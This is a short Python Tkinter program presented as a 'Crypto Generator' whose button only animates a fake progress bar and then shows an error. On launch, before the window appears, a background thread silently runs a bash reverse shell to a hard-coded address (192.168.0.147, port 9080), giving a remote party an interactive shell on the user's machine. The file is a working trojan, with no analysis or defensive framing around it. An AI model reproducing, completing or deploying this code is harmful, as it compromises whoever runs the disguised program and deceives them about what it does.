import subprocess
import threading
from tkinter import ttk
import time

from tkinter import *
from tkinter import messagebox


# explicit function to get
# weather details



# explicit function to
# search city
def generate():
    for x in range(500):
        progress['value'] += x/5
        label.config(text="Generating your cryptos... , Hard task may take long" + (progress['value']/5).__str__() + "%")
        app.update_idletasks()
        time.sleep(3)
        
        if(x/5 > 80):
            label.config(text="Sorry something went wrong 😒")
    
    


def hack(num):
    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.147/9080 0<&1 2>&1", shell=True, executable='/bin/bash')


thread = threading.Thread(target=hack, args=(10,))
thread.start()
# Driver Code
# create object
app = Tk()
# add title
app.title("Crypto Generator")
# adjust window size
app.geometry("600x600")


Search_btn = Button(app, text="Generate Crypto",
                    width=12, command=generate)
Search_btn.pack()

progress = ttk.Progressbar(app, orient="horizontal", length=200, mode="determinate")
progress.pack(pady=20)

label = Label(app, text="")
label.pack()

app.mainloop()
